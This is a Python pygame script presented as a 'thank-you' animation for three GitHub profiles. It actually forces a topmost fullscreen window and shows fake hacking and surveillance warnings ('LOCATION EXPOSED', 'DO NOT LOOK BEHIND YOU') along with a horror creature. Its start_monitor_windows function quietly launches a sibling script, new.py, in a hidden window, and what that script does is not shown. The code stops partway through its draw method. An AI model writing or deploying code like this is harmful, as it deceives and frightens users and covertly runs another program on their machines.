"""Render a short animated thank-you sequence for the configured profiles."""

import http.client
import io
import importlib
import json
import math
import queue
import random
import subprocess
import sys
import threading
import urllib.error
import urllib.request
import ctypes
from ctypes import wintypes
from pathlib import Path

from PIL import Image, ImageDraw

try:
    pygame = importlib.import_module("pygame")
except ModuleNotFoundError as error:
    if error.name == "pygame":
        raise SystemExit(
            "pygame is required to run this animation. "
            "Install it with: python -m pip install pygame"
        ) from None
    raise


PROFILES = [
    {
        "name": "Server-Tec",
        "handle": "@Server-Tec",
        "username": "Server-Tec",
        "color": "#f05a57",
        "glow": "#681d27",
    },
    {
        "name": "CodeVista-prog",
        "handle": "@CodeVista-prog",
        "username": "CodeVista-prog",
        "color": "#ff9d52",
        "glow": "#71351f",
    },
    {
        "name": "Rigmon840",
        "handle": "@Rigmon840",
        "username": "Rigmon840",
        "color": "#ff303d",
        "glow": "#7d101d",
    },
]

BACKGROUND = (8, 12, 17)
SCENE_DURATIONS = (7.8, 12.0, 7.8)


def activate_fullscreen_window():
    if sys.platform != "win32":
        return

    window_handle = pygame.display.get_wm_info().get("window")
    if not window_handle:
        return

    user32 = ctypes.WinDLL("user32", use_last_error=True)
    set_window_pos = user32.SetWindowPos
    set_window_pos.argtypes = [
        wintypes.HWND,
        wintypes.HWND,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.UINT,
    ]
    set_foreground_window = user32.SetForegroundWindow
    set_foreground_window.argtypes = [wintypes.HWND]

    window = wintypes.HWND(window_handle)
    set_window_pos(window, wintypes.HWND(-1), 0, 0, 0, 0, 0x0043)
    set_foreground_window(window)


def start_monitor_windows():
    """Start the monitor windows after the animation has finished."""
    script_path = Path(__file__).with_name("new.py")
    if not script_path.is_file():
        return

    options = {"cwd": script_path.parent}
    if sys.platform == "win32":
        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = subprocess.SW_HIDE
        options.update(
            creationflags=subprocess.CREATE_NO_WINDOW,
            startupinfo=startup_info,
        )
    subprocess.Popen([sys.executable, str(script_path)], **options)


def rgb(hex_color):
    """Convert a hexadecimal color string to an RGB tuple."""
    return tuple(int(hex_color[index:index + 2], 16) for index in (1, 3, 5))


def load_avatar(profile, avatar_queue):
    """Fetch, circularly mask, and enqueue a profile avatar when available."""
    try:
        request = urllib.request.Request(
            f"https://api.github.com/users/{profile['username']}",
            headers={"User-Agent": "WeGotYou-Animation"},
        )
        with urllib.request.urlopen(request, timeout=8) as response:
            avatar_url = json.loads(response.read().decode("utf-8"))["avatar_url"]
        request = urllib.request.Request(avatar_url, headers={"User-Agent": "WeGotYou-Animation"})
        with urllib.request.urlopen(request, timeout=8) as response:
            image = Image.open(io.BytesIO(response.read())).convert("RGBA")
        image = image.resize((256, 256), Image.Resampling.LANCZOS)
        mask = Image.new("L", image.size, 0)
        ImageDraw.Draw(mask).ellipse((0, 0, 255, 255), fill=255)
        image.putalpha(mask)
        avatar_queue.put((profile["username"], image.tobytes()))
    except (
        http.client.HTTPException,
        KeyError,
        OSError,
        TimeoutError,
        TypeError,
        urllib.error.URLError,
        ValueError,
    ):
        avatar_queue.put((profile["username"], None))


class WeGotYou:
    """Manage and render the full-screen animation."""

    def __init__(self):
        """Initialize the display, animation state, and avatar workers."""
        self.screen = None
        self.width = 0
        self.height = 0
        self.clock = None
        self.phase = 0.0
        self.running = False
        self.avatars = {}
        self.avatar_queue = queue.Queue()
        self.fonts = {}
        self.stars = []
        try:
            pygame.init()
            self.screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
            pygame.display.set_caption("We got you")
            activate_fullscreen_window()
        except pygame.error as exc:
            print(f"WeGotYou animation skipped: {exc}", file=sys.stderr)
            return

        self.width, self.height = self.screen.get_size()
        self.clock = pygame.time.Clock()
        self.running = True
        self.stars = [
            [
                random.random(),
                random.random(),
                random.uniform(0.07, 0.22),
                random.random() * math.tau,
            ]
            for _ in range(85)
        ]
        for profile in PROFILES:
            threading.Thread(
                target=load_avatar,
                args=(profile, self.avatar_queue),
                daemon=True,
            ).start()

    def font(self, size, bold=False):
        """Return a cached system font for the requested size and weight."""
        key = (size, bold)
        if key not in self.fonts:
            candidates = ["segoeui", "Segoe UI", "Arial", "Liberation Sans", "sans-serif"]
            font = None
            for name in candidates:
                try:
                    font = pygame.font.SysFont(name, size, bold=bold)
                    if font is not None:
                        break
                except pygame.error:
                    continue
            if font is None:
                font = pygame.font.SysFont(None, size, bold=bold)
            self.fonts[key] = font
        return self.fonts[key]

    def draw_text(self, text, center, size, color, bold=False):
        """Render text centered at the requested screen coordinates."""
        image = self.font(size, bold).render(text, True, color)
        self.screen.blit(image, image.get_rect(center=center))

    def collect_avatars(self):
        """Move completed avatar images from the worker queue into the cache."""
        while True:
            try:
                username, pixels = self.avatar_queue.get_nowait()
            except queue.Empty:
                break
            if pixels is not None:
                avatar = pygame.image.fromstring(pixels, (256, 256), "RGBA").convert_alpha()
                self.avatars[username] = avatar

    def draw_background(self, delta, profile):
        """Draw the animated background using the current profile colors."""
        accent = rgb(profile["color"])
        tint = rgb(profile["glow"])
        self.screen.fill((8, 7, 10))
        haze = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        for layer in range(4):
            drift = math.sin(self.phase * (0.11 + layer * 0.025) + layer) * self.width * 0.12
            haze_rect = pygame.Rect(
                int(self.width * (0.15 + layer * 0.22) + drift),
                int(self.height * (0.16 + layer * 0.13)),
                max(1, int(self.width * 0.34)),
                max(1, int(self.height * 0.06)),
            )
            pygame.draw.ellipse(
                haze,
                (*tint, 7 + layer * 2),
                haze_rect,
            )
        self.screen.blit(haze, (0, 0), special_flags=pygame.BLEND_RGBA_ADD)
        for band in range(12):
            offset = math.sin(self.phase * 0.24 + band * 0.65) * 52
            y = int((self.height * (band + 0.3) / 12 + offset) % self.height)
            color = tuple(int(channel * 0.24) for channel in tint)
            pygame.draw.line(self.screen, color, (0, y), (self.width, y - self.height // 10), 1)

        for star in self.stars:
            star[1] = (star[1] - star[2] * delta) % 1.0
            x = int(star[0] * self.width + math.sin(self.phase + star[3]) * 16)
            y = int(star[1] * self.height)
            brightness = 0.3 + 0.7 * abs(math.sin(self.phase * 1.5 + star[3]))
            color = tuple(int(channel * brightness) for channel in accent)
            pygame.draw.circle(self.screen, color, (x, y), 1 if brightness < 0.8 else 2)

        glow = pygame.Surface((320, 320), pygame.SRCALPHA)
        for radius, alpha in ((156, 5), (118, 8), (76, 11)):
            pygame.draw.circle(glow, (*tint, alpha), (160, 160), radius)
        glow_x = int(self.width * 0.68 + math.sin(self.phase * 0.31) * 100)
        glow_y = int(self.height * 0.56 + math.cos(self.phase * 0.23) * 90)
        self.screen.blit(glow, (glow_x - 160, glow_y - 160), special_flags=pygame.BLEND_RGBA_ADD)

    def draw_identity(self, profile, index, compact):
        """Draw the profile avatar, name, handle, and sequence number."""
        accent = rgb(profile["color"])
        glow = rgb(profile["glow"])
        avatar_radius = min(78, max(42, int(min(self.width / 14, self.height / 8))))
        avatar_x = self.width // 2 if compact else int(self.width * 0.21)
        avatar_y = int(self.height * (0.25 if compact else 0.43))
        pulse = 0.5 + 0.5 * math.sin(self.phase * 2.2)
        ring_radius = avatar_radius + 11 + int(pulse * 7)
        pygame.draw.circle(self.screen, glow, (avatar_x, avatar_y), ring_radius, 1)
        pygame.draw.circle(self.screen, accent, (avatar_x, avatar_y), avatar_radius + 3, 2)

        avatar = self.avatars.get(profile["username"])
        if avatar:
            image = pygame.transform.smoothscale(avatar, (avatar_radius * 2, avatar_radius * 2))
            self.screen.blit(image, image.get_rect(center=(avatar_x, avatar_y)))
        else:
            pygame.draw.circle(self.screen, (18, 28, 35), (avatar_x, avatar_y), avatar_radius)
            initials = "".join(
                part[0]
                for part in profile["name"].replace("-", " ").split()[:2]
            ).upper()
            self.draw_text(
                initials,
                (avatar_x, avatar_y),
                max(28, avatar_radius // 2),
                accent,
                True,
            )

        name_size = min(30, max(19, int(self.width * 0.021)))
        while (
            self.font(name_size, True).size(profile["name"])[0] > self.width * 0.42
            and name_size > 15
        ):
            name_size -= 1
        name_y = avatar_y + avatar_radius + 42
        self.draw_text(profile["name"], (avatar_x, name_y), name_size, (230, 238, 244), True)
        self.draw_text(profile["handle"], (avatar_x, name_y + 31), 14, (132, 151, 165))
        self.draw_text(f"0{index + 1}  /  03", (avatar_x, name_y + 68), 11, accent, True)

    def scene_center(self, compact):
        """Return the center point for the current scene layout."""
        x = self.width // 2 if compact else int(self.width * 0.69)
        y = int(self.height * (0.69 if compact else 0.56))
        return x, y

    def draw_server_scene(self, center):
        """Draw the animated server rack scene."""
        center_x, center_y = center
        accent = rgb(PROFILES[0]["color"])
        glow = rgb(PROFILES[0]["glow"])
        rack_width = min(146, max(72, int(self.width * 0.095)))
        rack_height = min(410, max(190, int(self.height * 0.48)))
        gap = max(12, int(rack_width * 0.16))
        total_width = rack_width * 3 + gap * 2
        left = center_x - total_width // 2
        top = center_y - rack_height // 2

        for link in range(2):
            x1 = left + rack_width + link * (rack_width + gap)
            pygame.draw.line(self.screen, glow, (x1, top + 35), (x1 + gap, top + 35), 2)
            for packet in range(3):
                progress = (self.phase * 0.7 + packet / 3 + link * 0.5) % 1.0
                packet_x = int(x1 + progress * gap)
                pygame.draw.circle(self.screen, accent, (packet_x, top + 35), 3)

        for rack_index in range(3):
            x = left + rack_index * (rack_width + gap)
            rect = pygame.Rect(x, top, rack_width, rack_height)
            pygame.draw.rect(self.screen, (12, 20, 27), rect, border_radius=8)
            pygame.draw.rect(self.screen, glow, rect, width=1, border_radius=8)
            pygame.draw.line(
                self.screen,
                accent,
                (x + 12, top + 18),
                (x + rack_width - 12, top + 18),
                2,
            )
            row_count = 5
            row_height = (rack_height - 52) // row_count
            for row in range(row_count):
                row_y = top + 34 + row * row_height
                unit = pygame.Rect(x + 9, row_y, rack_width - 18, row_height - 7)
                pygame.draw.rect(self.screen, (20, 31, 40), unit, border_radius=4)
                pygame.draw.rect(self.screen, (37, 55, 68), unit, width=1, border_radius=4)
                for led in range(3):
                    led_phase = self.phase * 3 + rack_index + row + led
                    led_color = accent if math.sin(led_phase) > -0.35 else (43, 58, 68)
                    pygame.draw.circle(
                        self.screen,
                        led_color,
                        (unit.left + 11 + led * 9, unit.centery),
                        2,
                    )
                bar_width = int(
                    (unit.width - 48)
                    * (0.32 + 0.5 * abs(math.sin(self.phase + row + rack_index)))
                )
                pygame.draw.line(self.screen, glow, (unit.left + 43, unit.centery),
                                 (unit.left + 43 + bar_width, unit.centery), 3)

        label_y = top - 45
        self.draw_text("SURVEILLANCE ACTIVE", (center_x, label_y), 17, (232, 204, 204), True)
        self.draw_text("CAMERAS 03  /  MOVEMENT DETECTED", (center_x, top + rack_height + 30),
                       11, accent, True)

    def draw_code_scene(self, center, scene_time):
        """Draw the animated code editor scene."""
        center_x, center_y = center
        accent = rgb(PROFILES[1]["color"])
        panel_width = min(int(self.width * 0.55), 850)
        panel_height = min(int(self.height * 0.52), 430)
        breach = max(0.0, min(1.0, (scene_time - 2.0) / 2.2))
        shake = int(breach * 5)
        center_x += int(math.sin(scene_time * 31) * shake)
        center_y += int(math.cos(scene_time * 27) * shake)
        panel = pygame.Rect(0, 0, panel_width, panel_height)
        panel.center = (center_x, center_y)
        pygame.draw.rect(self.screen, (12, 8, 12), panel, border_radius=12)
        pygame.draw.rect(self.screen, (150, 42, 43) if breach else (79, 54, 58),
                         panel, width=2 if breach else 1, border_radius=12)

        pygame.draw.line(self.screen, (37, 49, 59), (panel.left, panel.top + 48),
                         (panel.right, panel.top + 48), 1)
        for dot_index, color in enumerate(((108, 133, 148), (88, 117, 135), (79, 105, 121))):
            pygame.draw.circle(
                self.screen,
                color,
                (panel.left + 23 + dot_index * 19, panel.top + 24),
                5,
            )
        header = "CONNECTION BREACHED" if breach > 0.55 else "REMOTE TRACE  /  TARGET.PY"
        self.draw_text(header, (panel.centerx, panel.top + 24),
                   12, (255, 97, 83) if breach > 0.55 else (164, 130, 135), True)

        code = 'trace("YOU")'
        typed_count = min(len(code), max(0, int(max(0, scene_time - 0.35) * 15)))
        typed = code[:typed_count]
        code_x = panel.left + 48
        code_y = panel.top + 120
        mono = pygame.font.SysFont("consolas", max(22, min(34, int(panel_width * 0.042))))
        line_number = self.font(16).render("01", True, (83, 103, 116))
        self.screen.blit(line_number, (panel.left + 18, code_y + 5))

        prefix = 'trace('
        typed_prefix = typed[:min(len(typed), len(prefix))]
        prefix_surface = mono.render(typed_prefix, True, (188, 208, 221))
        self.screen.blit(prefix_surface, (code_x, code_y))
        remainder = typed[len(prefix):] if len(typed) > len(prefix) else ""
        string_surface = mono.render(remainder, True, accent)
        self.screen.blit(string_surface, (code_x + prefix_surface.get_width(), code_y))

        if typed_count < len(code) and int(scene_time * 2.4) % 2 == 0:
            cursor_x = code_x + mono.size(typed)[0]
            pygame.draw.rect(
                self.screen,
                accent,
                (cursor_x + 2, code_y + 5, 2, mono.get_height() - 8),
            )
        if typed_count == len(code):
            output_y = code_y + 76
            pygame.draw.circle(self.screen, accent, (code_x + 5, output_y + 12), 3)
            self.draw_text("TARGET LOCKED", (code_x + 135, output_y + 12), 20, (244, 209, 202), True)
            if scene_time > 2.0:
                self.draw_text("SIGNAL TRIANGULATED", (code_x + 12, output_y + 49),
                               13, (224, 155, 144), True)
            if scene_time > 3.2:
                self.draw_text("DISTANCE: 00.4 KM", (code_x + 12, output_y + 73),
                               13, (255, 93, 77), True)
            if scene_time > 4.2:
                self.draw_text("DO NOT LOOK BEHIND YOU", (code_x + 12, output_y + 97),
                               12, (255, 59, 64), True)

        if breach > 0.25:
            for glitch in range(3):
                glitch_y = panel.top + 72 + (int(scene_time * 61) + glitch * 79) % (panel.height - 88)
                glitch_x = panel.left + (int(scene_time * 97) + glitch * 131) % max(1, panel.width - 100)
                glitch_width = min(36 + glitch * 17, panel.right - glitch_x - 8)
                pygame.draw.rect(self.screen, (215, 49, 56),
                                 (glitch_x, glitch_y, glitch_width, 2))
        self.draw_text("LOCATION EXPOSED", (panel.left + 122, panel.bottom - 34),
                       11, accent, True)

    def draw_mascot(self, center, scale):
        """Draw the creature emerging from the portal."""
        x, y = center
        skin = (29, 8, 14)
        body = pygame.Rect(x - scale // 2, y - scale // 3, scale, int(scale * 1.2))
        pygame.draw.ellipse(self.screen, (7, 4, 8), body.inflate(scale // 3, scale // 5))
        pygame.draw.ellipse(self.screen, skin, body)

        horn_points = (
            [(x - scale // 3, body.top + scale // 4),
             (x - scale // 2, body.top - scale // 3),
             (x - scale // 10, body.top + scale // 8)],
            [(x + scale // 3, body.top + scale // 4),
             (x + scale // 2, body.top - scale // 3),
             (x + scale // 10, body.top + scale // 8)],
        )
        for points in horn_points:
            pygame.draw.polygon(self.screen, skin, points)
            pygame.draw.line(self.screen, (104, 24, 32), points[0], points[1], 2)

        eye_y = y - scale // 8
        eye_spacing = scale // 4
        eye_glow = (255, 41, 31) if math.sin(self.phase * 3.1) > -0.65 else (104, 12, 20)
        for eye_x in (x - eye_spacing, x + eye_spacing):
            pygame.draw.ellipse(
                self.screen, (63, 6, 13),
                (eye_x - scale // 8, eye_y - scale // 10, scale // 4, scale // 5),
            )
            pygame.draw.circle(self.screen, eye_glow, (eye_x, eye_y), max(4, scale // 12))
            pygame.draw.circle(self.screen, (255, 205, 162), (eye_x, eye_y), max(1, scale // 28))

        mouth = pygame.Rect(x - scale // 4, y + scale // 6, scale // 2, scale // 3)
        pygame.draw.ellipse(self.screen, (3, 2, 4), mouth)
        tooth_width = max(3, scale // 14)
        for tooth_x in range(mouth.left + 3, mouth.right - tooth_width, tooth_width + 2):
            pygame.draw.polygon(
                self.screen,
                (211, 183, 157),
                [(tooth_x, mouth.top + 2), (tooth_x + tooth_width // 2, mouth.top + scale // 9),
                 (tooth_x + tooth_width, mouth.top + 2)],
            )
        for leg_x, direction in ((x - scale // 3, -1), (x + scale // 3, 1)):
            pygame.draw.line(self.screen, skin, (leg_x, body.bottom - 8),
                             (leg_x + direction * scale // 3, body.bottom + scale // 4), 5)
            for claw in range(3):
                claw_x = leg_x + direction * (scale // 4 + claw * 4)
                pygame.draw.line(self.screen, (190, 42, 41),
                                 (claw_x, body.bottom + scale // 4 - 2),
                                 (claw_x + direction * 7, body.bottom + scale // 4 + 5), 2)

    def draw_horror_overlay(self, scene_index, scene_time):
        """Add restrained scan lines, edge darkening, and timed signal tears."""
        if scene_index != 2 or scene_time < 6.15:
            for y in range(2, self.height, 8):
                pygame.draw.line(self.screen, (2, 1, 3), (0, y), (self.width, y), 1)

        pulse = 0.5 + 0.5 * math.sin(self.phase * 0.55)
        edge_color = (int(48 + pulse * 42), 5, 13)
        pygame.draw.rect(self.screen, edge_color, (0, 0, self.width, 2))
        pygame.draw.rect(self.screen, edge_color, (0, self.height - 2, self.width, 2))
        pygame.draw.rect(self.screen, (18, 4, 10), (0, 0, 2, self.height))
        pygame.draw.rect(self.screen, (18, 4, 10), (self.width - 2, 0, 2, self.height))

        tear = (self.phase * 0.75) % 1.0
        if tear > 0.82 or (scene_index == 2 and scene_time > 5.0 and tear < 0.16):
            tear_y = int((math.sin(self.phase * 19) * 0.5 + 0.5) * (self.height - 8))
            tear_height = 2 + int(tear * 5)
            tear_x = int(math.sin(self.phase * 7.3) * self.width * 0.08)
            tear_rect = pygame.Rect(tear_x, tear_y, self.width, tear_height).clip(
                pygame.Rect(0, 0, self.width, self.height)
            )
            pygame.draw.rect(self.screen, (104, 10, 22), tear_rect)
            pygame.draw.line(
                self.screen, (174, 35, 43),
                (tear_rect.left, tear_rect.centery),
                (tear_rect.right, tear_rect.centery), 1,
            )

        if scene_index == 2 and 2.5 < scene_time < 3.3:
            apparition = max(0.0, math.sin((scene_time - 2.5) * 5.2)) ** 8
            if apparition > 0.1:
                eye_y = int(self.height * 0.43)
                eye_gap = max(26, int(self.width * 0.035))
                eye_x = self.width // 2
                for x in (eye_x - eye_gap, eye_x + eye_gap):
                    pygame.draw.ellipse(
                        self.screen, (int(90 * apparition), 3, 10),
                        (x - 13, eye_y - 5, 26, 10),
                    )
                    pygame.draw.circle(
                        self.screen, (int(255 * apparition), int(24 * apparition), 17),
                        (x, eye_y), 3,
                    )

    def draw_final_creature(self, progress):
        """Bring the creature into the foreground for the final reveal."""
        progress = max(0.0, min(1.35, progress))
        zoom = max(0.0, progress - 1.0)
        progress = min(1.0, progress)
        progress = progress * progress * (3.0 - 2.0 * progress)
        head_h = max(1, int(self.height * (0.32 + progress * 0.62 + zoom * 0.42)))
        head_w = max(1, min(int(self.width * (0.82 + zoom)), int(head_h * 0.78)))
        lunge = max(0.0, progress - 0.78)
        tremor = 1 if lunge <= 0 else int(math.sin(self.phase * 10.0) * lunge * 7)
        center_x = self.width // 2 + int(math.sin(self.phase * 2.4) * (1 + progress * 5)) + tremor
        center_y = int(self.height * 0.52 + math.sin(self.phase * 1.7) * (4 + zoom * 13))
        head = pygame.Rect(0, 0, head_w, head_h)
        head.center = (center_x, center_y)

        shadow = head.inflate(int(head_w * 0.22), int(head_h * 0.1))
        pygame.draw.ellipse(self.screen, (1, 1, 3), shadow)
        pygame.draw.ellipse(self.screen, (20, 5, 11), head)
        pygame.draw.ellipse(
            self.screen, (64, 9, 19),
            head.inflate(-max(2, head_w // 14), -max(2, head_h // 12)), 3,
        )

        for scar in range(5):
            scar_x = center_x + int(head_w * (-0.3 + scar * 0.14))
            scar_y = head.top + int(head_h * (0.12 + (scar % 2) * 0.11))
            scar_end = (
                scar_x + int(head_w * (0.04 if scar % 2 else -0.06)),
                scar_y + int(head_h * (0.12 + (scar % 3) * 0.035)),
            )
            pygame.draw.lines(
                self.screen, (94, 23, 32), False,
                [(scar_x, scar_y), ((scar_x + scar_end[0]) // 2 + 3, scar_y + 5), scar_end],
                max(1, head_w // 260),
            )

        for side in (-1, 1):
            horn_base_x = center_x + side * int(head_w * 0.31)
            horn_tip_x = center_x + side * int(head_w * 0.48)
            pygame.draw.polygon(
                self.screen, (14, 4, 9),
                [(horn_base_x - head_w // 12, head.top + head_h // 6),
                 (horn_tip_x, head.top - head_h // 10),
                 (horn_base_x + head_w // 16, head.top + head_h // 3)],
            )
            pygame.draw.line(
                self.screen, (102, 20, 30),
                (horn_base_x, head.top + head_h // 5),
                (horn_tip_x, head.top - head_h // 10), max(1, head_w // 220),
            )

        eye_y = center_y - int(head_h * 0.12)
        eye_gap = int(head_w * 0.2)
        eye_w = max(8, int(head_w * 0.21))
        eye_h = max(5, int(head_h * 0.075))
        eye_glow = 0.72 + 0.28 * abs(math.sin(self.phase * 1.15))
        gaze = int(math.sin(self.phase * 0.42) * eye_w * 0.1)
        for eye_index, side in enumerate((-1, 1)):
            eye_x = center_x + side * eye_gap
            tilt = (-1 if eye_index else 1) * eye_h // 2
            socket_points = [
                (eye_x - eye_w // 2, eye_y - tilt),
                (eye_x, eye_y - eye_h),
                (eye_x + eye_w // 2, eye_y + tilt),
                (eye_x, eye_y + eye_h),
            ]
            pygame.draw.polygon(self.screen, (3, 1, 4), socket_points)
            pygame.draw.polygon(self.screen, (111, 8, 17), socket_points, max(2, eye_w // 18))
            pygame.draw.ellipse(
                self.screen, (int(255 * eye_glow), int(19 * eye_glow), 10),
                (eye_x - eye_w // 3, eye_y - eye_h // 2,
                 eye_w * 2 // 3, eye_h),
            )
            pupil_x = eye_x + gaze + int(math.sin(self.phase * 0.9 + eye_index) * eye_w * 0.06)
            pygame.draw.ellipse(
                self.screen, (5, 1, 3),
                (pupil_x - max(2, eye_w // 20), eye_y - eye_h // 2,
                 max(4, eye_w // 10), eye_h),
            )
            pygame.draw.line(
                self.screen, (13, 3, 8),
                (eye_x - eye_w // 2, eye_y - eye_h),
                (eye_x + eye_w // 2, eye_y - eye_h // 2), max(2, eye_h // 3),
            )

        mouth_w = int(head_w * (0.31 + 0.08 * abs(math.sin(self.phase * 1.25))))
        mouth_h = int(head_h * (0.2 + 0.09 * abs(math.sin(self.phase * 1.25))))
        mouth = pygame.Rect(0, 0, mouth_w, mouth_h)
        mouth.center = (center_x, center_y + int(head_h * 0.22))
        pygame.draw.ellipse(self.screen, (1, 0, 2), mouth.inflate(head_w // 26, head_h // 32))
        mouth_glow = pygame.Surface((mouth.width + head_w // 8, mouth.height + head_h // 8), pygame.SRCALPHA)
        pygame.draw.ellipse(
            mouth_glow, (143, 12, 24, 34),
            mouth_glow.get_rect().inflate(-head_w // 18, -head_h // 24),
        )
        self.screen.blit(
            mouth_glow,
            mouth_glow.get_rect(center=mouth.center).topleft,
            special_flags=pygame.BLEND_RGBA_ADD,
        )
        tooth_w = max(4, head_w // 25)
        for tooth_index, tooth_x in enumerate(
            range(mouth.left + tooth_w // 2, mouth.right - tooth_w, tooth_w * 2)
        ):
            tooth_h = max(5, int(head_h * (0.025 + (tooth_index % 3) * 0.008)))
            pygame.draw.polygon(
                self.screen, (205, 183, 158),
                [(tooth_x, mouth.top + 2),
                 (tooth_x + tooth_w // 2, mouth.top + tooth_h),
                 (tooth_x + tooth_w, mouth.top + 2)],
            )
            pygame.draw.polygon(
                self.screen, (205, 183, 158),
                [(tooth_x, mouth.bottom - 2),
                 (tooth_x + tooth_w // 2, mouth.bottom - tooth_h),
                 (tooth_x + tooth_w, mouth.bottom - 2)],
            )
        for side in (-1, 1):
            tear_x = center_x + side * int(head_w * 0.2)
            tear_top = eye_y + eye_h // 2
            tear_bottom = tear_top + int(head_h * (0.13 + 0.02 * abs(math.sin(self.phase))))
            pygame.draw.line(
                self.screen, (100, 5, 17), (tear_x, tear_top), (tear_x + side * 5, tear_bottom),
                max(2, head_w // 100),
            )
            pygame.draw.circle(
                self.screen, (132, 9, 18), (tear_x + side * 5, tear_bottom), max(2, head_w // 90),
            )

        arm_y = center_y + int(head_h * 0.26)
        for side in (-1, 1):
            shoulder = (center_x + side * int(head_w * 0.37), arm_y)
            wrist = (center_x + side * int(self.width * (0.39 + 0.06 * progress)),
                     int(self.height * 0.68))
            pygame.draw.line(self.screen, (15, 4, 9), shoulder, wrist, max(8, head_w // 13))
            pygame.draw.circle(self.screen, (22, 5, 10), wrist, max(12, head_w // 18))
            for claw in range(4):
                claw_x = wrist[0] + side * (claw - 1) * max(5, head_w // 34)
                claw_tip = (
                    claw_x + side * max(8, head_w // 30),
                    wrist[1] + int(self.height * (0.13 + claw * 0.018)),
                )
                pygame.draw.line(
                    self.screen, (20, 4, 8), wrist, claw_tip, max(4, head_w // 45),
                )
                pygame.draw.line(
                    self.screen, (139, 31, 38), claw_tip,
                    (claw_tip[0] - side * max(2, head_w // 90),
                     claw_tip[1] + max(6, head_h // 24)), max(2, head_w // 100),
                )

        if progress > 0.78 and zoom < 0.05:
            warning = self.font(max(22, min(48, self.width // 24)), True)
            text = warning.render("DON'T TURN AROUND", True, (210, 18, 27))
            text.set_alpha(int(100 + 155 * (0.5 + 0.5 * math.sin(self.phase * 1.1))))
            self.screen.blit(text, text.get_rect(center=(center_x, int(self.height * 0.91))))

    def draw_portal_scene(self, center, scene_time):
        """Draw the animated portal scene and its mascot."""
        center_x, center_y = center
        radius = min(240, max(68, int(min(self.width * 0.17, self.height * 0.28))))
        outer = (231, 47, 53)
        inner = (35, 10, 16)
        pygame.draw.circle(self.screen, (28, 8, 13), (center_x, center_y), radius + 22)
        pygame.draw.circle(self.screen, outer, (center_x, center_y), radius + 14, 2)
        pygame.draw.circle(self.screen, (112, 23, 35), (center_x, center_y), radius + 5, 5)
        pygame.draw.circle(self.screen, inner, (center_x, center_y), radius)
        pygame.draw.circle(self.screen, (79, 20, 29), (center_x, center_y), int(radius * 0.73), 2)

        for ring in range(4):
            ring_radius = int(radius * (0.36 + ring * 0.14))
            rect = pygame.Rect(center_x - ring_radius, center_y - ring_radius,
                               ring_radius * 2, ring_radius * 2)
            start = self.phase * (0.7 + ring * 0.16) * (1 if ring % 2 else -1)
            pygame.draw.arc(self.screen, (190 + ring * 14, 34 + ring * 8, 47 + ring * 8),
                            rect, start, start + 2.0, 2)

        for particle in range(18):
            angle = self.phase * 0.65 + particle * math.tau / 18
            distance = radius * (0.28 + 0.66 * ((particle * 7 % 18) / 18))
            px = int(center_x + math.cos(angle) * distance)
            py = int(center_y + math.sin(angle) * distance)
            pygame.draw.circle(self.screen, (255, 83, 66), (px, py), 2 + particle % 2)

        tendril_points = []
        for tendril in range(5):
            angle = self.phase * 0.18 + tendril * math.tau / 5
            start_distance = radius * 0.68
            end_distance = radius * (1.12 + 0.08 * math.sin(self.phase + tendril))
            start = (
                int(center_x + math.cos(angle) * start_distance),
                int(center_y + math.sin(angle) * start_distance),
            )
            end = (
                int(center_x + math.cos(angle + 0.25) * end_distance),
                int(center_y + math.sin(angle + 0.25) * end_distance),
            )
            bend = (
                int((start[0] + end[0]) / 2 + math.sin(self.phase * 1.7 + tendril) * radius * 0.16),
                int((start[1] + end[1]) / 2 + math.cos(self.phase * 1.3 + tendril) * radius * 0.12),
            )
            tendril_points.append((start, bend, end))
        for start, bend, end in tendril_points:
            pygame.draw.lines(self.screen, (92, 17, 27), False, (start, bend, end), 3)
            pygame.draw.circle(self.screen, (211, 35, 42), end, 2)

        stillness = max(0.0, min(1.0, (scene_time - 2.6) / 0.5))
        bob = math.sin(self.phase * 1.8) * radius * 0.08 * (1.0 - stillness)
        jerk_offsets = (-0.28, 0.26, 0.38, -0.18, -0.36, 0.12)
        jerk = jerk_offsets[int(self.phase * 5) % len(jerk_offsets)] * (1.0 - stillness)
        mascot_center = (
            int(center_x + radius * (0.93 + jerk)),
            int(center_y + radius * 0.48 + bob),
        )
        self.draw_mascot(mascot_center, max(34, int(radius * 0.46)))
        self.draw_text("NO EXIT FOUND", (center_x, center_y + radius + 64),
                   11, (241, 125, 111), True)
        if scene_time > 3.3:
            reveal = (scene_time - 3.3) / 1.4
            if scene_time > 6.15:
                reveal = 1.0 + (scene_time - 6.15) * 1.0
            if scene_time > 6.55:
                flash = 0.5 + 0.5 * math.sin((scene_time - 6.55) * 18)
                blackout = pygame.Surface((self.width, self.height))
                blackout.fill((35, 0, 8) if flash > 0.72 else (0, 0, 2))
                blackout.set_alpha(120 if flash > 0.72 else 190)
                self.screen.blit(blackout, (0, 0))
            self.draw_final_creature(reveal)

    def draw_vignette(self, scene_index, scene_time):
        """Focus attention toward the center without hiding the animation."""
        overlay = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        strength = 82 if scene_index < 2 else min(150, int(82 + scene_time * 9))
        edge = max(18, int(min(self.width, self.height) * 0.09))
        for inset in range(edge, 0, -max(2, edge // 18)):
            alpha = int(strength * (1 - inset / edge) ** 2)
            pygame.draw.rect(
                overlay,
                (0, 0, 0, alpha),
                (inset, inset, self.width - inset * 2, self.height - inset * 2),
                width=max(2, edge // 18),
            )
        self.screen.blit(overlay, (0, 0))

    def draw_signal_warning(self, scene_index, scene_time):
        """Show sparse warnings that escalate only in the final scene."""
        messages = (
            ("CAMERA 03: SUBJECT MOVING", 1.4),
            ("TRACE COMPLETE", 2.2),
            ("DO NOT TURN AROUND", 4.6),
        )
        if scene_index == 2 and scene_time > messages[2][1]:
            text = self.font(12, True).render(messages[2][0], True, (227, 35, 43))
            alpha = int(90 + 120 * abs(math.sin(self.phase * 0.7)))
            text.set_alpha(alpha)
            self.screen.blit(text, (self.width - text.get_width() - 34, self.height - 68))
        elif scene_index < 2 and scene_time > messages[scene_index][1]:
            text = self.font(11, True).render(messages[scene_index][0], True, (164, 54, 61))
            text.set_alpha(170)
            self.screen.blit(text, (34, self.height - 68))

    def draw(self, delta):
        """Render the current frame and advance animation state."""
        scene_start = 0.0
        for scene_index, duration in enumerate(SCENE_DURATIONS):
            if self.phase < scene_start + duration:
                break
            scene_start += duration
